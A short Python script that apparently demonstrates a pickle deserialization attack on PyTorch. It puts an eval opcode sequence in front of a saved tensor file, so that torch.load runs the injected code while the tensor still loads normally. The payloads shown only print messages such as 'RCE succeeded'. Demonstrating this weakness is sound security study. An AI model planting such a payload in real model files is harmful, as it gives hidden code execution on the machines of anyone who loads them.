import torch
import pickletools
import numpy as np

tensor = torch.tensor([1, 2, 3, 4, 5])
torch.save(tensor, 'tensor.pt', _use_new_zipfile_serialization=False)
with open('tensor.pt', 'rb') as f:
    x = f.read()

# print(pickletools.dis(x))

pickled_bomb = b'c__builtin__\neval\n(Vprint("Hello from Gregor")\ntR0'
# pickled_bomb = b'c__builtin__\neval\n(Vprint("RCE succeeded")\ntR.'
pickled_bomb += x
# print(pickletools.dis(pickled_bomb))
with open("foo.pt","wb") as f:
    f.write(pickled_bomb)
result_tensor = torch.load("foo.pt")
assert all(tensor == result_tensor)